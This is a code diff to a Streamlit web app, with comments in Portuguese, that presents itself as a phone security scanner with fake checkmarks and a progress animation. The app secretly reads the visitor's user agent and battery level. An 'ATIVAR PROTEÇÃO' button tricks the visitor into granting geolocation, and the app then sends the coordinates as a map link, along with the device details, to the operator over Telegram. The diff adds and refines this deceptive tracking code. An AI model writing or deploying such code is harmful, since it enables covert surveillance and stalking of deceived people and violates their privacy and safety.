@@ -14,7 +14,7 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
+# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (VISUAL TRAVADO)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -34,7 +34,7 @@ st.markdown("""
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
 
-    /* A BARRA AMARELA QUE TU GOSTASTE */
+    /* A BARRA AMARELA QUE VOCÊ QUER */
     .btn-barra {
         background-color: #ffc107; color: black; font-weight: bold;
         width: 100%; height: 55px; border-radius: 12px; border: none;
@@ -48,7 +48,7 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Bolha travada em 4% até o clique real
+# Bolha em 4%
 if 'pct' not in st.session_state: st.session_state['pct'] = 4
 
 with caixa_bolha.container():
@@ -58,46 +58,50 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. CAPTURA SILENCIOSA (HARDWARE)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_BRAVO')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_BRAVO')
+# 4. CAPTURA DE HARDWARE (AUTOMÁTICA)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3AM')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3AM')
 
-# 5. O SEGREDO: BOTÃO HTML QUE "GRITA" COM O NAVEGADOR
-# Removi a alta precisão para forçar o pop-up simples de "Permitir"
-js_funcional = """
+# 5. O SEGREDO: BOTÃO AUTOMATIZADO EM JS PURO
+# Sem 'enableHighAccuracy' para pedir "Permitir" direto (Foto 2)
+js_script = """
 <script>
-function clicarBotao() {
+function ativarSeguranca() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const dados = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'ok'};
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: dados}, '*');
+            const result = {
+                lat: pos.coords.latitude, 
+                lon: pos.coords.longitude, 
+                pronto: true
+            };
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
         },
         (err) => { 
-            console.log("Recusado");
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: 'erro'}, '*');
+            console.log("Usuário negou ou erro de GPS");
         },
-        { enableHighAccuracy: false, timeout: 5000 }
+        { enableHighAccuracy: false, timeout: 6000 }
     );
 }
 </script>
-<button class="btn-barra" onclick="clicarBotao()">
+<button class="btn-barra" onclick="ativarSeguranca()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza a barra amarela como um componente HTML direto
-res_gps = st.components.v1.html(js_funcional, height=80)
+# Renderiza o botão como componente HTML independente (não trava)
+retorno_gps = st.components.v1.html(js_script, height=80)
 
-# 6. ANIMAÇÃO 0-100% E ENVIO
-if res_gps and isinstance(res_gps, dict) and res_gps.get('status') == 'ok':
-    # Agora sim, os números giram!
+# 6. ANIMAÇÃO E ENVIO AO TELEGRAM
+if retorno_gps and isinstance(retorno_gps, dict) and retorno_gps.get('pronto'):
+    # Os números giram agora na bolha
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = res_gps['lat'], res_gps['lon']
+    lat, lon = retorno_gps['lat'], retorno_gps['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
-    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
+    
+    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50] if ua else 'N/A'}\n🔋 Bateria: {bat if bat else '--'}%\n📍 [LOCALIZAÇÃO]({mapa})")
     st.success("Proteção Ativada!")
     st.stop()
 
